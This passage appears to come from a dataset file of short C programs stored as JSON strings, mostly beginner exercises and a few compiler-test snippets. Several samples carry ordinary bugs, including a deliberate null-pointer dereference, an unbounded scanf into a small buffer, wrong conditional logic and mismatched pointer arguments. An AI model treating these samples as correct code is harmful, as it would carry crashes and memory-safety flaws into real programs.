pthread_mutex_unlock(&mutex);\n    return ((void*)0);\n}",
    "#include <stdio.h>\nchar *find_first_occurance(char *string, char character);\nint main()\n{\n    char *string = \"abcdefghijklmnopq\";\n    for (char character = 'a'; character <= 'z'; character++)\n        printf(\"%p\\n\", find_first_occurance(string, character));\n    return 0;\n}\nchar *find_first_occurance(char *string, char character)\n{\n    while (*string != '\\0') {\n        if (*string == character) return string;\n        string++;\n    }\n    return ((void*)0);\n}",
    "#include <stdio.h>\n#include <stdlib.h>\n#include <math.h>\nint compare (int *a, int *b);\nvoid pwrFunc(int *LargeNumber);\nint main()\n{\n    int number1, number2, result;\n    printf(\"Enter a number: \");\n    scanf(\" %d\", &number1);\n    printf(\"Enter another number: \");\n    scanf(\" %d\", &number2);\n    result = compare(&number1, &number2);\n    pwrFunc(&result);\n    return 0;\n}\nint compare(int *a, int *b)\n{\n    if (*a > *b)\n    {\n        return *a;\n    }\n    else if (*b > *a)\n    {\n        return *b;\n    }\n    else\n    {\n        return printf(\"The numbers are equal.\\n\");\n    }\n}\nvoid pwrFunc(int *LargeNumber)\n{\n    int power = 0;\n    power = pow(*LargeNumber, 4);\n    printf(\"%d to the 4th power is %d\\n\", *LargeNumber, power);\n}",
    "#include <stdio.h>\nint main()\n{\n    unsigned char a,b = 0;\n    scanf(\"%hhu\", &a);\n    b += a;\n    scanf(\"%hhu\", &a);\n    b += a;\n    scanf(\"%hhu\", &a);\n    b += a;\n    scanf(\"%hhu\", &a);\n    b += a;\n    printf(\"%hhu\\n\", b-3);\n    return 0;\n}",
    "#include <stdio.h>\n#include <stdbool.h>\nint main() {\n    int dividers[10] = {20, 19, 18, 17, 16, 15, 14, 13, 12, 11};\n    unsigned int answer = 2520;\n    while (1) {\n        answer++;\n        _Bool found = 1;\n        for (int i = 0; i < 10; ++i) {\n            if (answer % dividers[i] != 0) {\n                found = 0;\n                break;\n            }\n        }\n        if (found) {\n            break;\n        }\n    }\n    printf(\"answer: %d\\n\", answer);\n    return 0;\n}",
    "#include <stdio.h>\n#include <math.h>\nint main(){\n    int n,x,i,t;\n   scanf(\"%d\",&n);\n   for(x=n+1;;x++)\n   {\n     if(n==1)\n        {printf(\"2\");\n        break;}\n     else if(n==2)\n        {printf(\"3\");\n        break;}\n    else\n      {\n    for(i=2,t=0;i<x;i++)\n    {\n        if(x%i==0)break;\n        else t++;\n    }\n      }\n      if(t==x-2)\n      {\n          printf(\"%d\",x);\n          break;\n      }\n   }\n   return 0;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\nint A[5];\nint foo(int i) {\n  A[3] = i + A[2];\n  return A[(i >= 0 && i < 5) ? i : 0];\n}\nfloat B[15];\nfloat bar(int i) {\n  B[3] = i + B[2];\n  return B[(i >= 0 && i < 5) ? i : 0];\n}\nvoid vararr(int sz) {\n  int my[sz];\n  int i;\n  for (i = 0; i < sz; ++i) {\n    my[i] = i;\n  }\n  for (i = 0; i < sz; ++i) {\n    if (my[i] != i) {\n      abort();\n    }\n  }\n}\nint main()\n{\n  vararr(4);\n  A[0] = 0;\n  A[2] = A[3] = 2;\n  if (A[3] != 2) {\n    abort();\n  }\n  if (foo(2) != 2) {\n    abort();\n  }\n  if (A[3] != 4) {\n    abort();\n  }\n  if (foo(5) != 0) {\n    abort();\n  }\n  if (A[3] != 7) {\n    abort();\n  }\n  B[0] = 0;\n  B[1] = B[2] = B[3] = 3;\n  if (B[3] != 3) {\n    abort();\n  }\n  if (bar(1) != 3) {\n    abort();\n  }\n  if (B[3] != 4) {\n    abort();\n  }\n  if (bar(5) != 0) {\n    abort();\n  }\n  if (B[3] != 8) {\n    abort();\n  }\n  return 0;\n}",
    "#include <stdio.h>\n#include <ctype.h>\n#include <stdlib.h>\nvoid menu();\nvoid receberValorInteiro(int *valor);\nfloat receberValorReal();\nfloat calcularNovoSalario(float salarioAtual);\nfloat calcularSalario(float*, int);\nint main(){\n    menu();\n    return 0;\n}\nvoid menu(){\n    char opcao;\n    int numero;\n    float *salarios;\n    do {\n        printf(\"\\nA - Calcular novo sal\u00e1rio\");\n        printf(\"\\nB - Finalizar\");\n        printf(\"\\nDigite a op\u00e7\u00e3o: \");\n        scanf(\" %c\", &opcao);\n        opcao = toupper(opcao);\n        if (opcao == 'A') {\n            printf(\"\\nIniciar c\u00e1lculo do sal\u00e1rio.\");\n            receberValorInteiro(&numero);\n            salarios = (float*) malloc (numero * sizeof(float));\n            printf(\"\\nA m\u00e9dia dos sal\u00e1rios calculados \u00e9 R$%.2f\", calcularSalario(&salarios, numero));\n        }\n    } while (opcao != 'B');\n}\nvoid receberValorInteiro(int *valor){\n    printf(\"\\nDigite um n\u00famero inteiro de 1 at\u00e9 50: \");\n    scanf(\"%i\", valor);\n    while (*valor < 1 || *valor > 50) {\n        printf(\"\\nValor incorreto. Digite novamente.\");\n        printf(\"\\nDigite um n\u00famero inteiro de 1 at\u00e9 50: \");\n        scanf(\"%i\", valor);\n    }\n}\nfloat receberValorReal(){\n    float valor = -3;\n    while (valor <= 0) {\n        printf(\"\\nDigite o valor do sal\u00e1rio R$\");\n        scanf(\"%f\", &valor);\n        if (valor <= 0){\n            printf(\"\\nValor inv\u00e1lido.\");\n        }\n    }\n    return valor;\n}\nfloat calcularNovoSalario(float salarioAtual){\n    if (salarioAtual <= 2500) {\n        return salarioAtual * 1.15;\n    } else if (salarioAtual <= 7500) {\n        return salarioAtual * 1.075;\n    } else {\n        return salarioAtual;\n    }\n}\nfloat calcularSalario(float *vetor, int tamanho) {\n    float somaSalarios = 0;\n    for (int i = 1; i <= tamanho; i++) {\n        printf(\"\\nDigite o %i\u00ba sal\u00e1rio.\", i);\n        *vetor = receberValorReal();\n        *vetor = calcularNovoSalario(*vetor);\n        somaSalarios += *vetor;\n        vetor++;\n    }\n    return somaSalarios / tamanho;\n}",
    "#include <stdio.h>\nint main()\n{\n    int i;\n    for(i=10;i>=1;i--)\n    {\n        printf(\"%i\\n\",i);\n    }\n     return 0;\n}",
    "#include <stdio.h>\nint main(void)\n{\n  char chr, initial;\n  int marker = 1;\n  printf(\"Enter a first and last name: \");\n  do\n  {\n    chr = getchar();\n    if (marker == 1)\n    {\n      marker = 2;\n      initial = chr;\n    }\n    else if (marker == 3 && chr != '\\n')\n      printf(\"%c\", chr);\n    if (chr == ' ')\n      marker = 3;\n    else if (chr == '\\n')\n      printf(\", %c.\", initial);\n  }\n  while (chr != '\\n');\n  printf(\"\\n\");\n  return 0;\n}",
    "#include<stdio.h>\nvoid push(int *c,int red[],int green[],int *redsize,int *greensize){\n    int num;\n    printf(\"Enter number: \");\n    scanf(\"%d\",&num);\n    if((*c==-1))\n        *c=num;\n    else if(num%2==0){\n        red[*redsize]=num;\n        (*redsize)++;\n    }\n    else{\n        green[*greensize]=num;\n        (*greensize)++;\n    }\n}\nvoid pop_red(int *redsize){\n    if(*redsize>0)\n        (*redsize)--;\n}\nvoid pop_green(int *greensize){\n    if(*greensize>0)\n        (*greensize)--;\n}\nvoid print(int *c,int red[],int green[],int *redsize,int *greensize){\n    if(*greensize>0){\n        for(int i=*greensize-1;i>=0;i--)\n            printf(\"%d<-\",green[i]);\n    }\n    if(*c!=-1){\n        printf(\"%d\",*c);\n    }\n    if(*redsize>0){\n        for(int i=0;i<*redsize;i++)\n            printf(\"->%d\",red[i]);\n    }\n    printf(\"\\n\");\n}\nint main(){\n    int c=-1;\n    int red[100];\n    int green[100];\n    int redsize=0;\n    int greensize=0;\n    printf(\"1.Push\\n2.Pop Red\\n3.Pop Green\\n4.Print\\n\");\n    printf(\"Enter your choice: \");\n    int choice;\n    scanf(\"%d\",&choice);\n    while(choice>=0 && choice<=4){\n        if(choice==1){\n            push(&c,red,green,&redsize,&greensize);\n        }\n        else if(choice==2){\n            pop_red(&redsize);\n        }\n        else if(choice==3){\n            pop_red(&greensize);\n        }\n        else if(choice==4)\n            print(&c,red,green,&redsize,&greensize);\n        printf(\"Enter your choice: \");\n        scanf(\"%d\",&choice);\n    }\n}",
    "#include <stdio.h>\nint main()\n{\n    int n1, n2, i, gcd, lcm;\n    printf(\"Enter two positive integers: \");\n    scanf(\"%d %d\", &n1, &n2);\n    for (i = 1; i <= n1 && i <= n2; ++i)\n    {\n        if (n1 % i == 0 && n2 % i == 0)\n            gcd = i;\n    }\n    lcm = (n1 * n2) / gcd;\n    printf(\"The LCM of two numbers %d and %d is %d.\", n1, n2, lcm);\n    return 0;\n}",
    "int main(int argc, char *argv[]) { }",
    "#include <stdio.h>\n#include <stdlib.h>\nint main(void) {\n  int len = 312;\n  int *options = ((void*)0);\n  options = (int *)calloc(sizeof(int), len);\n  for (int i = 0; i < len; i++) {\n    options[i] = 69 + i;\n  }\n  for (int i = 0; i < len; i++) {\n    printf(\"options[%d] = %d\\n\", i, options[i]);\n  }\n}",
    "unsigned char num_to_lcd(unsigned char a)\n{\n  switch(a)\n    {\n    case 0x00: return 0;\n    case 0x01: return 0x24;\n    case 0x02: return 1+4+8+16+64;\n    case 0x03: return 1+4+8+32+64;\n    case 0x04: return 2+4+8+32;\n    case 0x05: return 1+4+8+16+64;\n    case 0x06: return 1+2+8+16+32+64;\n    case 0x07: return 1+4+32;\n    case 0x08: return 0x7F;\n    case 0x09: return 0x0F + 32 + 64;\n    case 0x0A: return 0x0F + 16 + 32;\n    case 0x0B: return 2+8+16+32+64;\n    case 0x0C: return 1+2+16+64;\n    case 0x0D: return 4+8+16+32+64;\n    case 0x0E: return 1+2+8+16+64;\n    case 0x0F: return 1+2+8+16;\n    }\n  return 0;\n}\nvolatile unsigned char IN;\nvolatile unsigned char OUT;\nint main(void)\n{\n  int i;\n  unsigned char a;\n int n;\n  n = 10;\n  for(i=0; i< n; i++)\n    {\n      a = IN;\n      if(i<5)\n        {\n          a = a &0x0F;\n          OUT = num_to_lcd(a);\n        }\n    }\n  return 0;\n}",
    "#include<stdio.h>\nint zone(int);\nint main()\n{\n int n,m,i;\n scanf(\"%d\",&n);\n for(i=n+1;;i++)\n {\n  if(i==zone(i)||i==2)\n  {\n   printf(\"%d\",i);\n   break;\n  }\n }\n return 0;\n}\nint zone(int g)\n{\n int j,k=0;\n for(j=2;j<g;j++)\n {\n  if(g%j==0)\n  {\n   k++;\n  }\n }\n if(k==0)\n  return g;\n else\n  return 0;\n}",
    "#include <stdio.h>\nint main(void)\n{\n int month, day, year;\n printf(\"Enter a date (mm/dd/yy): \");\n scanf(\"%d/%d/%d\", &month, &day, &year);\n printf(\"You entered the date %.2d%.2d%.4d\\n\", month, day, year);\n return 0;\n}",
    "#include<stdio.h>\n#include<stdlib.h>\nint powernum(int base, int index)\n{ static int result=1;\n    if(index>0)\n    {\n        result=result*base;\n        powernum(base,index-1);\n    }\n    else\n    {\n        return result;\n    }\n    return result;\n}\nint main(int argc, char const *argv[])\n{\n    int base,index,result;\n    printf(\"Enter the base number::\");\n    scanf(\"%d\",&base);\n    printf(\"Enter the index::\");\n    scanf(\"%d\",&index);\n    result = powernum(base,index);\n    printf(\"The %d^%d = %d\",base,index,result);\n    return 0;\n}",
    "int main()\n{\n  return 0;\n}",
    "int main() {\n  int *x[5][5];\n  int i1 = 2;\n  int i2 = 1;\n  int *y[5][5];\n  int j1 = 2;\n  int j2 = 1;\n  x[i1][i2] = y[j1][j2];\n  return(0);\n}",
    "#include <stdio.h>\n#include <stdlib.h>\nint main(int argc, char* argv[]){\n printf(\"Content-Type: text/plain; charset=utf-8\\n\");\n return 1;\n}",
    "#include <stdio.h>\n\nlong long int calculateWinner(long long int starting_player, long long int piles[], long long int no_of_piles){\n    long long int nim_sum = 0;\n    long long int i;\n    for (i = 0; i < no_of_piles; i++){\n        nim_sum = nim_sum ^ piles[i];\n    }\n    if (nim_sum){\n        return starting_player;\n    }\n    return (starting_player + 1) % 2;\n}\nint main()\n{\n    long long int starting_player;\n    printf(\"Enter starting player:\\n\");\n    scanf(\"%lld\", &starting_player);\n    long long int no_of_piles;\n    printf(\"Enter number of piles:\\n\");\n    scanf(\"%lld\", &no_of_piles);\n    printf(\"Enter number of stones in each pile:\\n\");\n    long long int piles[no_of_piles], i;\n    for (i = 0; i < no_of_piles; i++)\n        scanf(\"%lld\", &piles[i]);\n    long long int ans = calculateWinner(starting_player, piles, no_of_piles);\n    printf(\"Player %lld will win.\", ans);\n}",
    "#include <stdio.h>\nint main(int argc, char const *argv[])\n{\n    int A[100], n, sum = 0;\n    float avg;\n    printf(\"Declare array size : \");\n    scanf(\"%d\", &n);\n    printf(\"Enter elements :\\n\");\n    for (int i = 0; i < n; i++)\n    {\n        printf(\"A[%d] : \", i);\n        scanf(\"%d\", &A[i]);\n    }\n    for (int i = 0; i < n; i++)\n    {\n        if (A[i] > 0)\n        {\n            sum += A[i];\n            avg = sum / n;\n        }\n    }\n    printf(\"Sum is %d.\\n\", sum);\n    printf(\"Average is %.2f.\", avg);\n    return 0;\n}",
    "int main() {\n    int * pointeur = 0;\n    int value = *pointeur;\n    return 0;\n}",
    "#include<stdio.h>\n#include<string.h>\nvoid encrypt1(char *str);\nvoid decrypt1(char *str);\nvoid encrypt2(char *str1, char *str2);\nvoid decrypt2(char *str1,char *str2);\nint strch(char *str, char ch);\nint main(void)\n{\n char str[100],str2[30];\n strcpy(str,\"program\");\n puts(str);\n encrypt1(str);\n puts(str);\n decrypt1(str);\n puts(str);\n strcpy(str2,\"mnkghdtabwvuprqczjxieyflos\");\n strcpy(str,\"program\");\n puts(str);\n encrypt2(str,str2);\n puts(str);\n decrypt2(str,str2);\n puts(str);\n return 0;\n}\nvoid encrypt1(char *str)\n{\n for( ;*str!='\\0'; str++)\n {\n  if(*str<97 || *str>122)\n   continue;\n  if(*str=='z')\n   *str='a';\n  else\n   *str=*str+1;\n }\n}\nvoid decrypt1(char *str)\n{\n for( ; *str!='\\0'; str++)\n {\n  if(*str<97 || *str>122)\n   continue;\n  if(*str=='a')\n   *str='z';\n  else\n   *str=*str-1;\n }\n}\nvoid encrypt2(char *str1, char *str2)\n{\n for( ;*str1!='\\0'; str1++)\n {\n  if(*str1<97 || *str1>122)\n   continue;\n  *str1=str2[*str1-97];\n }\n}\nvoid decrypt2(char *str1, char *str2)\n{\n int i;\n for( ; *str1!='\\0'; str1++)\n {\n  if(*str1<97 || *str1>122)\n   continue;\n  i=strch(str2,*str1);\n  *str1=i+97;\n }\n}\nint strch(char *str, char ch)\n{\n int i;\n for(i=0; str[i]!='\\0'; i++)\n  if(str[i]==ch)\n   return i;\n}",
    "#include <stdint.h>\n#include <stdio.h>\n\nuint32_t rnd_16(uint32_t n)\n{\n uint32_t f = n & 0xffff;\n if(f <= 0x7fff)\n {\n  return n >> 16;\n }\n return (n >> 16) + 1;\n}\nint main()\n{\n FILE *fp = fopen(\"bitmap.ppm\", \"wb\");\n fprintf(fp, \"P6\\n%d %d\\n255\\n\", 64, 64);\n unsigned char white[3] = {0xff, 0xff, 0xff};\n unsigned char black[3] = {0x00, 0x00, 0x00};\n for(int i = 1; i < 64; i++)\n {\n  uint32_t step = (64 << 16) / i;\n  uint32_t stepsum = 0;\n  printf(\"Power level %02d, step size 0x%08x: \", i, step);\n  int sum = 0;\n  for(int j = 0; j < 64; j++)\n  {\n   if(j == rnd_16(stepsum))\n   {\n    fwrite(black, sizeof(black), 1, fp);\n    sum++;\n    stepsum += step;\n   }\n   else\n   {\n    fwrite(white, sizeof(black), 1, fp);\n   }\n  }\n  printf(\"  sum %03d\", sum);\n  if(sum != i)\n   printf(\" -- error!! (%02d) --\", i);\n  printf(\"\\n\");\n }\n}",
    "#include <stdio.h>\nint main() {\nint N,C,D=0,E=0;\nscanf(\"%d\",&N);\nfor(C = 0; C < N;C++){\n    scanf(\"%d\",&D);\n    if(D >= 10 && D <=20){\n        E++;\n    }\n}\nprintf(\"%d in\\n\",E);\nprintf(\"%d out\\n\",N-E);\nreturn 0;\n}",
    "#include <stdio.h>\nint main()\n{\n  int distance ,payment = 0 ;\n  printf( \"Enter distance travelled\" ) ;\n  scanf( \"%d\" , &distance ) ;\n  if( distance < 30 )\n    payment = distance * 50 ;\n  else\n    payment = 30 * 50 + (distance-30) * 40 ;\n  printf( \"Total payment is %d\" , payment ) ;\n  return 0;\n}",
    "#include <stdio.h>\n#include <string.h>\n\nint main() {\n FILE *inputSet;\n inputSet = fopen(\"input.txt\", \"r\");\n int y;\n int x;\n int num;\n int hits1;\n int hits2;\n int hits3;\n int hits4;\n int hits5;\n char buffer[32768];\n x = 0;\n num = 0;\n memset(buffer, 0, sizeof(buffer));\n for (y = 0; y < 323;){\n  fscanf(inputSet, \"%c\", &buffer[x]);\n  if (buffer[x] == 10){\n   if (num == 0){\n    num = x;\n   }\n   y++;\n  }\n  x++;\n }\n x = 0;\n hits1 = 0;\n hits2 = 0;\n hits3 = 0;\n hits4 = 0;\n hits5 = 0;\n for (y = 0; y < 323; y++){\n  while(x > num-1){\n   x = x - num;\n  }\n  if (buffer[x+(num+1)*y] == 35){\n   hits1++;\n  }\n  x = x + 1;\n }\n x = 0;\n for (y = 0; y < 323; y++){\n  while(x > num-1){\n   x = x - num;\n  }\n  if (buffer[x+(num+1)*y] == 35){\n   hits2++;\n  }\n  x = x + 3;\n }\n x = 0;\n for (y = 0; y < 323; y++){\n  while(x > num-1){\n   x = x - num;\n  }\n  if (buffer[x+(num+1)*y] == 35){\n   hits3++;\n  }\n  x = x + 5;\n }\n x = 0;\n for (y = 0; y < 323; y++){\n  while(x > num-1){\n   x = x - num;\n  }\n  if (buffer[x+(num+1)*y] == 35){\n   hits4++;\n  }\n  x = x + 7;\n }\n x = 0;\n for (y = 0; y < 323; y++){\n  while(x > num-1){\n   x = x - num;\n  }\n  if (buffer[x+(num+1)*y] == 35){\n   hits5++;\n  }\n  x = x + 1;\n  y++;\n }\n printf(\"%s\", buffer);\n printf(\"%u\\n\", hits1 * hits2 * hits3 * hits4 * hits5);\n fclose(inputSet);\n return 0;\n}",
    "#include<stdio.h>\n#include<stdlib.h>\n#include<string.h>\nint main(int argc, char const *argv[]) {\n  char word[10];\n  char string[100];\n  int count = 0;\n  scanf(\"%s\\n\", word);\n  scanf(\"%100[^\\n]s\\n\", string);\n  char* token = strtok(string,\" \");\n  if(strcmp(token,word) == 0) {\n      count++;\n  }\n  while(token != ((void*)0)) {\n    if(strcmp(token,word) == 0) {\n        count++;\n    }\n    token = strtok(((void*)0),\" \");\n  }\n  printf(\"%d\\n\",count);\n  return 0;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\n#include <locale.h>\n\nint main(int argc, char const *argv[]){\n    int matriz[3][3];\n    int vetor[3] = {0, 0, 0};\n    for(int l = 0; l < 3; l++){\n        for(int c = 0; c < 3; c++){\n            scanf(\"%d\", &matriz[l][c]);\n        }\n    }\n    for(int linha = 0; linha < 3; linha++){\n        for (int coluna = 0; coluna < 3; coluna++){\n            if(coluna == 0){\n                vetor[0] += matriz[linha][coluna];\n            }else if(coluna == 1){\n                vetor[1] += matriz[linha][coluna];\n            }else{\n                vetor[2] += matriz[linha][coluna];\n            }\n        }\n    }\n    for(int x = 0; x < 3; x++){\n        printf(\"%d \", vetor[x]);\n    }\n    return 0;\n}",
    "#include <stdio.h>\nchar *month_name(int n);\nint main(){\n int n;\n char *pmonth;\n printf(\"Input number:\");\n scanf(\"%d\",&n);\n pmonth=month_name(n);\n printf(\"%s\\n\",pmonth);\n return 0;\n}\nchar *month_name(int n){\n static char *name[]={\n \"Illegal month\",\"January\",\"February\",\"March\",\"April\",\"May\",\"June\",\"July\",\"August\",\"September\",\"October\",\"November\",\"December\"\n };\n return (n<1 || n>12)?name[0]:name[n];\n}",
    "int main(void)\n{\n    int fiftytwo = 52;\n    int five = 5;\n    return fiftytwo - five - five;\n}",
    "#include <stdio.h>\nint main()\n{\n    unsigned int a,b,c;\n    while (scanf(\"%u%u\", &a, &b) != (-1)) {\n        c = a ^ b;\n        printf(\"%u\\n\", c);\n    }\n    return 0;\n}",
    "#include <stdio.h>\n\nint input[100001];\nint calc(int num)\n{\n    if (num ==1)\n    {\n        return 1;\n    }\n    return num + calc(num-1);\n}\nint main()\n{\n    int n, i, start, end, sum, start_test, end_test, sum_test;\n    while (scanf(\"%d\", &n) != (-1))\n    {\n        printf(\"rv: %d\\n\", calc(n));\n    }\n    return 0;\n}",
    "#include<stdio.h>\n#include<stdlib.h>\n#include<time.h>\nint main(){\n    int number, guess, nguesses = 1;\n    srand(time(0));\n    number = rand()%100 +1;\n    do{\n        printf(\"guess the number between 1 to 100 \\n\");\n        scanf(\"%d\", &guess);\n        if(guess>number){\n            printf(\"Lower number please \\n\");\n        }\n        else if(guess<number){\n            printf(\"Higher number please \\n\");\n        }\n        else{\n            printf(\"you guessed in %d attempts \\n\", nguesses);\n        }\n        nguesses++;\n    }while(guess!=number);\n    return 0;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\nvoid my_print(char*);\nvoid my_print2(char*);\nint main(void)\n{\n   char my_string[] = \"Hello world\";\n   my_print(my_string);\n   my_print2(my_string);\n   return 0;\n}\nvoid my_print(char *string)\n{\n   printf(\"The string is %s\\n\", string);\n}\nvoid my_print2(char *string)\n{\n   char *string2;\n   int size, size2, j;\n   size = strlen(string);\n   size2 = size - 1;\n   string2 = (char *)malloc(size + 1);\n   for(j = 0; j < size; j++){\n      string2[size2 -j] = string[j];\n   }\n   string2[size] = '\\0';\n   printf(\"The string printed backword is %s\\n\", string2);\n}",
    "#include <stdio.h>\n#include <stdlib.h>\nint main()\n{\n    int workingDays;\n    float USDPerDay, USD;\n    printf(\"Enter the average working days per month: \");\n    scanf(\"%d\", &workingDays);\n    printf(\"Enter the average income per day in USD: \");\n    scanf(\"%f\", &USDPerDay);\n    printf(\"Enter the current amount USD to BGN: \");\n    scanf(\"%f\", & USD);\n    float incomePerMonth = workingDays * USDPerDay;\n    float incomePerYear = incomePerMonth * 12;\n    incomePerYear += incomePerMonth * 2.5;\n    incomePerYear -= incomePerYear * 0.25;\n    float totalBGNPerYear = incomePerYear * USD;\n    float averageBGNPerDay = totalBGNPerYear / 365;\n    printf(\"The average profit in BGN per day is: %g\", averageBGNPerDay);\n    return 0;\n}",
    "#include <stdio.h>\n#include <math.h>\nint main(void)\n{\n    printf(\"\u5706\u5468\u7387\u7684\u4f30\u7b97\\n\");\n    printf(\"\u6309\u4e0bEnter\u952e\u5f00\u59cb\u8fd0\u884c\\n\");\n    getchar();\n    int s;\n    float n,t,pi;\n    t=1,pi=0;n=1.0;s=1;\n    while(fabs(t)>1e-6)\n    {\n        pi=pi+t;\n        n=n+2;\n        s=-s;\n        t=s/n;\n    }\n    pi=pi*4;\n    printf(\"pi=%10.6f\\n\",pi);\n    return 0;\n}",
    "\n\nconst unsigned char A[] = { \"abc\" };\nconst unsigned char A1[] = \"abc\";\nconst unsigned char B[] = { \"a\" \"b\" \"c\" };\nconst unsigned char C[] = { 'a', 'b', 'c' };\nconst unsigned char C1[] = { \"a\", 'b', 'c' };\nint some_array__LINE__[(sizeof(A)==4) ? 1 : -1];\nint some_array__LINE__[(sizeof(A)==sizeof(A1)) ? 1 : -1];\nint some_array__LINE__[(sizeof(B)==4) ? 1 : -1];\nint some_array__LINE__[(sizeof(C)==3) ? 1 : -1];\nint some_array__LINE__[(sizeof(C1)==2) ? 1 : -1];\nint main()\n{\n  return 0;\n}",
    "#include <stdio.h>\nint main()\n{\n    double salario, imposto;\n    scanf(\"%lf\", &salario);\n    if (salario == 0.00 || salario <= 2000.00)\n    {\n        printf(\"Isento\\n\");\n    }\n    else if (salario > 2000.00 || salario <= 3000.00)\n    {\n        imposto = 0.08;\n        salario = salario * imposto;\n        printf(\"R$ %0.2lf\\n\", salario);\n    }\n    else if (salario > 3000.00 && salario <= 4500.00)\n    {\n        imposto = 0.18;\n        salario = salario * imposto;\n        printf(\"R$ %0.2lf\\n\", salario);\n    } else if(salario>4500.00){\n        imposto=0.28;\n        printf(\"R$ %0.2lf\\n\", salario);\n    }\n    return 0;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\n\ntypedef int indextype, infotype;\ninfotype info[100];\nindextype next[100];\nindextype add_list(infotype x, indextype p)\n{\n    static indextype avail = 0;\n    indextype q;\n    q = avail++;\n    if (q == 100) {\n        printf(\"\u6e80\u676f\u3067\u3059.\\n\"); exit(1);\n    }\n    info[q] = x; next[q] = p;\n    return q;\n}\nvoid show_list(indextype p)\n{\n    while (p != 100) {\n        printf(\" %d\", info[p]); p = next[p];\n    }\n    printf(\"\\n\");\n}\nindextype reverse_list(indextype p)\n{\n    indextype q, t;\n    q = 100;\n    while (p != 100) {\n        t = q; q = p; p = next[p]; next[q] = t;\n    }\n    return q;\n}\nint main(void)\n{\n    infotype x;\n    indextype head;\n    head = 100;\n    for (x = 1; x <= 9; x++)\n        head = add_list(x, head);\n    show_list(head);\n    head = reverse_list(head);\n    show_list(head);\n    return 0;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\nint main()\n{\n    int N, i;\n    printf(\"Quantos numeros voce vai digitar? \\n\");\n    scanf(\"%d\", &N);\n    int vet[N];\n    for(i = 0; i < N; i++){\n        printf(\"Digite um numero: \");\n        scanf(\"%d\", &vet[i]);\n    }\n    printf(\"\\nNUMEROS NEGATIVOS:\\n\");\n    for(i = 1; i < N; i++){\n        if(vet[i] < 0){\n            printf(\"%d\\n\", vet[i]);\n        }\n         }\n    return 0;\n}",
    "#include <stdio.h>\n#include <math.h>\nvoid solve(float a, float b, float c)\n{\n    float discriminant = b*b - 4*a*c;\n    if(discriminant > 0)\n    {\n        float discSqrt = sqrt(discriminant);\n        printf(\"As raizes s\u00e3o: %f %f\\n\", (-b + discSqrt)/(2*a), (-b - discSqrt)/(2*a));\n    }\n    else if(discriminant == 0)\n    {\n        printf(\"Tem raiz dupla: %f\\n\", (-b)/(2*a));\n    }\n    else\n    {\n        float realPart = -b/(2*a);\n        float complexPart = sqrt(-discriminant)/(2*a);\n        printf(\"Tem raizes complexas: %f+%fi %f-%fi\\n\", realPart, complexPart, realPart, complexPart);\n    }\n}\nint main()\n{\n    float a, b, c;\n    printf(\"Introduza o valor de a: \");\n    scanf(\"%f\", &a);\n    printf(\"Introduza o valor de b: \");\n    scanf(\"%f\", &b);\n    printf(\"Introduza o valor de c: \");\n    scanf(\"%f\", &c);\n    solve(a, b, c);\n    return 0;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\nint main()\n{\n    FILE *fp = (stdin);\n    char *line = ((void*)0);\n    size_t len = 0;\n    ssize_t read;\n    char *str1 = ((void*)0), *str2, *token = ((void*)0);\n    char *saveptr = ((void*)0);\n    char space[1];\n    space[0] = ' ';\n    int j;\n    float val = 0;\n    while((read = getline(&line, &len, fp)) != -1) {\n        for(j = 1, str1 = line; ;j++, str1 = ((void*)0)) {\n            token = strtok_r(str1, space, &saveptr);\n            if(token == ((void*)0)) break;\n            val = atof(token);\n            fwrite(&val, sizeof(float), 1, (stdout));\n        }\n    }\n    free(line);\n    return 0;\n}",
    "#include <stdio.h>\nvoid quicksort(int* m, int first, int last)\n{\n    int i = first, j = last;\n    double tmp, x = m[(first + last) / 2];\n    do {\n        while (m[i] < x)\n            i++;\n        while (m[j] > x)\n            j--;\n        if (i <= j)\n        {\n            if (i < j)\n            {\n                tmp=m[i];\n                m[i]=m[j];\n                m[j]=tmp;\n            }\n            i++;\n            j--;\n        }\n    } while (i <= j);\n    if (i < last)\n        quicksort(m, i, last);\n    if (first < j)\n        quicksort(m, first,j);\n}\nint main()\n{\n    int n, i;\n    scanf(\"%d\", &n);\n    int m[n];\n    for(i=0; i<n; i++){\n        scanf(\"%d\", &m[i]);\n    }\n    quicksort(m,0,n-1);\n    for(i=0; i<n; i++){\n        printf(\"%d \", m[i]);\n    }\n    printf(\"\\n\");\n}",
    "#include <stdio.h>\n#include <stdlib.h>\n#include <time.h>\n\n\n\nint sequenceSearch(int ary[], int n, int data) {\n    int i;\n    for (i = 0; i < n; i++) {\n        if (ary[i] == data)\n            return i;\n    }\n    return -1;\n}\nint sequenceSearchOrdered(int ary[], int n, int data) {\n    int i = 0;\n    while (i < n && data > ary[i]) {\n        i++;\n    }\n    if (i < n && data == ary[i])\n        return i;\n    return -1;\n}\nint binarySearch(int ary[], int n, int data) {\n    int low, mid, high;\n    low = 0;\n    high = n - 1;\n    while (low <= high) {\n        mid = (low + high) / 2;\n        if (ary[mid] == data) {\n            return mid;\n        } else if (ary[mid] < data) {\n          low = mid + 1;\n        } else {\n            high = mid - 1;\n        }\n    }\n    return -1;\n}\nvoid insertSort(int ary[], int n) {\n    int i, j, key;\n    for (i = 1; i < n; i++) {\n        key = ary[i];\n        for (j = i - 1; j >=0 && ary[j] > key; j--) {\n            ary[j + 1] = ary[j];\n        }\n        ary[j + 1] = key;\n    }\n}\nint * initArray(int ary[], int n) {\n    int i;\n    srand(time(((void*)0)));\n    for (i = 0; i < n; i++) {\n        ary[i] = (rand() % 100);\n    }\n}\nvoid printArray(int ary[], int n) {\n    int i;\n    for (i = 0; i < n; i++) {\n        printf(\"%d\\t\", ary[i]);\n    }\n    putchar('\\n');\n}\nint main() {\n    int ary[10];\n    initArray(ary, 10);\n    printArray(ary, 10);\n    printf(\"Sorted...\\n\");\n    insertSort(ary, 10);\n    printArray(ary, 10);\n    int value, index = 0;\n    printf(\"Input a value to be found: \");\n    scanf(\"%d\", &value);\n    index = sequenceSearchOrdered(ary, 10, value);\n    if (index == -1) {\n        printf(\"Not found.\\n\");\n    } else {\n        printf(\"Found! Index = %d\\n\", index);\n    }\n}",
